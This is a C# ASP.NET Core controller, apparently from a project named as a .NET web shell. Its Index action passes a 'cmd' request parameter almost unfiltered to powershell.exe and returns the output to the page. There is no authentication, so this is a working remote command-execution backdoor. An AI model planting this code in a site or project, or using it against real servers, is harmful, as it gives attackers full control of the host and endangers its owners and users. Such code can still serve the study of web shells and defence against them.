using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Mvc.Rendering;
using Microsoft.EntityFrameworkCore;
using web_shell_dotnetcore;
using web_shell_dotnetcore.Models;

namespace web_shell_dotnetcore.Controllers
{
    public class PowerShellCMsController : Controller
    {
        private readonly AppContext _context;

        public PowerShellCMsController(AppContext context)
        {
            _context = context;
        }

        // GET: PowerShellCMs
        public async Task<IActionResult> Index(string cmd)
        {
            var result = "";
            var escapedArgs = cmd.Replace("\"", "\\\"");
            var process = new Process()
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-c \"{escapedArgs}\"",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                }
            };

            process.Start();
            result = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            ViewBag.res = result;
            return View();
        }

        

        private bool PowerShellCMExists(int id)
        {
            return _context.PSCommands.Any(e => e.Id == id);
        }
    }
}
